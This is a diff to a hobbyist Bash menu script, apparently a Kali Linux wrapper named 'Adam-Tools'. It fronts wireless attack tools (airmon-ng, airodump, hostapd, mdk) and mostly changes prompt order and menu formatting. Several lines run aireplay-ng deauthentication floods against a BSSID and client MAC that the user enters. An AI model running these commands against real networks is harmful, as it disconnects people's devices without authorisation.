@@ -18,6 +18,7 @@ echo -e "Press \e[1;33m any key\e[0m to install the script..."
 read -n 1
 clear
 apt-get -y install gnome-terminal
+alias adamtool='/home/kali/Desktop/bash/test-bash/Adam-Tools/./Adam-Tools.sh'
 clear
 #apt autoremove gnome-terminal
 figlet I ❤ Adam_ALwan | lolcat
@@ -25,11 +26,11 @@ figlet I ❤ Adam_ALwan | lolcat
 printf '\033]2;INSTALLER\a'
 echo -e "1)\e[1;33m airmon-ng\e[0m "
 echo -e "2)\e[1;33m START Monitor mode\e[0m "
-echo -e "3)\033[1;37m aireplay-ng network \033[0m"
+echo -e "3)\033[1;37m aireplay-ng network "
 echo -e "4) aireplay-ng mac Target "
-echo -e "5)airodump "
-echo -e "6)Run Hostapd "
-echo -e "7)mdk ataack"
+echo -e "5) airodump "
+echo -e "6) Run Hostapd "
+echo -e "7) mdk ataack \033[0m"
 
 
 #echo -e "4)Run dnsmasq "
@@ -60,18 +61,19 @@ read -p "Enter number channel :# " c
 sudo iwconfig $i channel $c
 read -p "Enter Bssid :# " bssid
 read -p "Enter number of packet :# " packet
-read -p "Enter Intrface :# " i
+#read -p "Enter Intrface :# " i
 sleep 1
 sudo xterm -e aireplay-ng -0 $packet -a $bssid $i
 #
 read -p "please Enter Yor Option > " tryag
 elif [[ $tryag -eq '4' ]]; then
 echo -e "Whait...!"
+read -p "Enter Intrface :# " i
+read -p "Enter number channel :# " c
+sudo iwconfig $i channel $c
 read -p "Enter Bssid :# " bssid
 read -p "Enter mac Target :# " t
-read -p "Enter Intrface :# " i
 read -p "Enter number of packet :# " pack
-#read -p "Enter number channel :# " c
 sudo xterm -e aireplay-ng -0 $pack -a $bssid -c $t $i
 #
 read -p "please Enter Yor Option > " tryag
